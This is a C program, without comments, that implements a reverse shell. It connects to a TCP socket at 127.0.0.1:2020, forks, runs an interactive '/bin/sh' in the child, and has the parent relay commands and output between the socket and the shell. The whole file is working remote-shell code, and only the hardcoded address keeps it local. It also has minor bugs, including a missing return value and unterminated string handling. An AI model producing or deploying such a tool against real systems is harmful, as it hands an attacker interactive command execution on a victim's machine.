#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

typedef union
{
  struct
  {
    int fd_read;
    int fd_write;
  };
  int pipes[2];
} pipes_t;

bool g_abort = false;

int create_socket(char* host, char* port)
{
  int sock = -1;
  int ret = -1;
  int result = -1;
  do
  {
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
      perror("Failed to create socket");
      break;
    }

    struct linger linger_opts =
    {
      .l_onoff = 1,
      .l_linger = 0
    };

    ret = setsockopt(
      sock,
      SOL_SOCKET,
      SO_LINGER,
      &linger_opts,
      sizeof(linger_opts));

    if (ret < 0)
    {
      perror("Failed to setsockopt(SO_LINGER)");
      break;
    }

    int sockopt = 1;
    ret = setsockopt(
      sock,
      SOL_SOCKET,
      SO_REUSEADDR,
      &sockopt,
      sizeof(sockopt));

      if (ret < 0)
      {
        perror("Failed to setsockopt(SO_REUSEADDR)");
        break;
      }

      ret = fcntl(sock, F_GETFL, 0);
      if(ret < 0)
      {
        perror("Failed to fcntl(F_GETFL)");
        break;
      }

      ret = fcntl(sock, F_SETFL, ret | O_NONBLOCK);
      if(ret < 0)
      {
        perror("Failed to fcntl(F_SETFL)");
        break;
      }

      struct hostent *server = gethostbyname(host);
      int port_no = htons(atoi(port));
      struct sockaddr_in addr =
      {
        .sin_family = AF_INET,
        .sin_port = port_no,
      };
      memcpy(&addr.sin_addr.s_addr, server->h_addr, sizeof(addr.sin_addr.s_addr));
      ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
      if(ret < 0 && errno != EINPROGRESS)
      {
        perror("Failed to connect");
        break;
      }

      fd_set outs = {0};
      FD_ZERO(&outs);
      FD_SET(sock, &outs);
      struct timeval timest =
      {
        .tv_sec = 0,
        .tv_usec = 500000,
      };

      ret = select(
          sock + 1,
          NULL,
          &outs,
          NULL,
          &timest);

      if (ret <= 0)
      {
        perror("Failed to select");
        break;
      }

      int get_ret = 0;
      unsigned int get_len = sizeof(get_ret);	/* socklen_t */

      ret = getsockopt(sock, SOL_SOCKET, SO_ERROR, &get_ret, &get_len);
      if (ret < 0)
      {
        perror("Failed to getsockopt");
        break;
      }

      if (get_ret > 0)
      {
        dprintf(STDERR_FILENO, "SO_ERROR set: %s\n", strerror(get_ret));
        break;
      }

      result = sock;

    } while(false);

    if (result < 0)
    {
      if(sock > 0)
      {
        shutdown(sock, SHUT_RDWR);
        close(sock);
        sock = -1;
      }
    }

    return result;
}

int run_child(pipes_t to_child, pipes_t from_child)
{
  int ret = -1;
  int saved_stderr = -1;

  saved_stderr = dup(STDERR_FILENO);
  if(saved_stderr < 0)
  {
    perror("Failed to dup(STDERR_FILENO)");
    return -1;
  }

  ret = dup2(to_child.fd_read, STDIN_FILENO);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to dup2(STDIN_FILENO)");
    return -1;
  }

  ret = close(to_child.fd_read);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to close(to_child.fd_read)");
    return -1;
  }

  ret = dup2(from_child.fd_write, STDOUT_FILENO);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to dup2(STDOUT_FILENO)");
    return -1;
  }

  ret = close(from_child.fd_write);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to close(to_child.fd_read)");
    return -1;
  }

  ret = dup2(STDOUT_FILENO, STDERR_FILENO);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to dup2(STDERR_FILENO)");
    return -1;
  }

  ret = execl("/bin/sh", "-l", "-i", NULL);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to execl");
    return -1;
  }

  return 0;
}

int do_read(char* prefix, fd_set* fds, int fd_from, int fd_to)
{
  if(FD_ISSET(fd_from, fds) == false)
  {
    return 0;
  }

  unsigned char buf[1024] = {0};
  size_t bytes_read = read(fd_from, buf, sizeof(buf));
  if(bytes_read == 0)
  {
    perror("EOF");
    return -1;
  }

  size_t bytes_written = write(fd_to, buf, bytes_read);
  if (bytes_written != bytes_read)
  {
    perror("Failed to write");
    return -1;
  }

  for(
    char* tok = strtok(buf, "\n");
    tok != NULL;
    tok = strtok(NULL, "\n")
  )
  {
    dprintf(2, "%s%s\n", prefix, tok);
  }

}

void signal_handler(int signal)
{
  pid_t pid = getpid();
  dprintf(2, "Process: %d, Received Signal: %s\n", pid, strsignal(signal));
  g_abort = true;
}

int run_parent(int sock, pipes_t to_child, pipes_t from_child)
{
  int ret = -1;
  int result = -1;

  signal(SIGCHLD, signal_handler);
  signal(SIGINT, signal_handler);

  while (g_abort == false)
  {
    fd_set read_fds = {0};
    FD_ZERO(&read_fds);
    FD_SET(from_child.fd_read, &read_fds);
    FD_SET(sock, &read_fds);
    int nfds = (sock > from_child.fd_read) ? (sock + 1): (from_child.fd_read + 1);
    ret = select(nfds, &read_fds, NULL, NULL, NULL);
    if (ret < 0)
    {
      perror("Failed to select");
      break;
    }

    if (ret == 0)
    {
      continue;
    }

    ret = do_read("TX >> ", &read_fds, from_child.fd_read, sock);
    if (ret < 0)
    {
      perror("Failed to do_read(from_child.fd_read)");
      break;
    }

    ret = do_read("RX << ", &read_fds, sock, to_child.fd_write);
    if (ret < 0)
    {
      perror("Failed to do_read(from_child.fd_read)");
      break;
    }
  }

  return result;
}

int main(int argc, char** argv)
{
  int sock = -1;
  int ret = -1;
  pipes_t to_child = { -1, -1 };
  pipes_t from_child = { -1, -1 };

  do
  {
    sock = create_socket("127.0.0.1", "2020");
    if (sock < 0)
    {
      perror("Failed to create_socket");
      break;
    }

    ret = pipe2(to_child.pipes, O_NONBLOCK);
    if(ret < 0)
    {
      perror("Failed to pipe2(to_child)");
      break;
    }

    ret = pipe2(from_child.pipes, O_NONBLOCK);
    if(ret < 0)
    {
      perror("Failed to pipe2(from_child)");
      break;
    }

    signal(SIGCHLD, SIG_DFL);

    pid_t pid = fork();
    if (pid < 0) // error
    {
      perror("Failed to fork");
      break;
    }
    else if (pid == 0) // child
    {
      dprintf(2, "CHILD\n");
      ret = run_child(to_child, from_child);
      if (ret < 0)
      {
        perror("Failed to run_child");
        break;
      }
    }
    else //parent
    {
      pid_t parent = getpid();
      dprintf(2, "PARENT: %d, CHILD: %d\n", parent, pid);
      ret = run_parent(sock, to_child, from_child);
      if (ret < 0)
      {
        perror("Failed to run_child");
        break;
      }
    }
  } while(false);

  if(sock > 0)
  {
    shutdown(sock, SHUT_RDWR);
    close(sock);
    sock = -1;
  }

  dprintf(STDERR_FILENO, "DONE\n");
}
